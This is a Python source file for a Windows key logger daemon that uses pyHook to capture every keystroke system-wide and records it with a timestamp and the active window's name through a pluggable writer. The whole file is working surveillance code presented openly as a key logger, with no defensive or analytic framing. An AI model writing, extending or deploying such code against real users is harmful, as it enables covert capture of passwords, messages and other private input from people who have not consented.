from datetime import datetime
import pyHook
import pythoncom

from plugin_manager import PluginManager


class KeyLoggerDaemon:
    """
    A basic implementation of a python key logger
    stores logged keys per-window per-date in a json format

    buffer structure - {date: {windows name: [list of keystrokes]}}

    Considerations:
        - PyHook isn't great and can miss keystrokes
        - Can cause a noticeable slow down on older machines
        - Window may not always be identifiable
        - All keystrokes are returned in uppercase (may be able to fix this with ASCII repr)
        - commas, brackets, hashes etc are returned as Oem_nameOfPunctuation (may be able to fix this with ASCII repr)
    """

    def __init__(self):
        self.__hook = hook = pyHook.HookManager()
        hook.KeyDown = self.__write_event
        hook.HookKeyboard()

        self.plugin = PluginManager().plugin

    def __write_event(self, event: pyHook.KeyboardEvent):
        """
        keyboard press callback, process each key press as necessary.
        the buffer is written out on every key event
        """
        # print(event.WindowName, event.Key, chr(int(event.Ascii)))  # debug
        print(event.Key)
        key = chr(int(event.Ascii))
        if key == '\x00':
            key = event.Key

        self.plugin.write(datetime.now(), event.WindowName, key)
        return True  # required by hook manager

    @staticmethod
    def watch():
        """
        Starts the hook event loop
        """
        pythoncom.PumpMessages()


if __name__ == '__main__':
    logger = KeyLoggerDaemon()
    logger.watch()
